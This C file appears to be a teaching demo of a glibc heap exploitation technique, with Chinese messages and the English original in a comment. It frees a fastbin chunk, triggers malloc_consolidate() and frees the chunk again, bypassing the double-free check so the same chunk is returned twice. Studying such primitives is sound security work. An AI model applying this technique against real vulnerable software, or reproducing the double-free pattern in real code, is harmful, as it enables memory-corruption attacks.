#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
  void* p1 = malloc(0x40);
  void* p2 = malloc(0x40);
  fprintf(stderr, "分配两个fastbin chunk: p1=%p p2=%p\n", p1, p2);
  fprintf(stderr, "现在我们free掉 p1!\n");
  free(p1);

  void* p3 = malloc(0x400);
  fprintf(stderr, "分配一个large bin来触发 malloc_consolidate(): p3=%p\n", p3);
  fprintf(stderr, "在 malloc_consolidate()执行的时候, p1 会被放进 unsorted bin.\n");
  free(p1);
  fprintf(stderr, "现在就触发了double-free漏洞!\n");
  fprintf(stderr, "因为现在的p1不再是fastbin-freelist的顶部了,因此我们现在就可以bypass掉malloc()的检测了\n");
  fprintf(stderr, "现在的p1既在fastbin中,又在unsorted bin中. 所以现在我们再分配就可以得到两次fastbin了: %p %p\n", malloc(0x40), malloc(0x40));
}

/*
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
  void* p1 = malloc(0x40);
  void* p2 = malloc(0x40);
  fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
  fprintf(stderr, "Now free p1!\n");
  free(p1);

  void* p3 = malloc(0x400);
  fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
  fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
  free(p1);
  fprintf(stderr, "Trigger the double free vulnerability!\n");
  fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
  fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
}
*/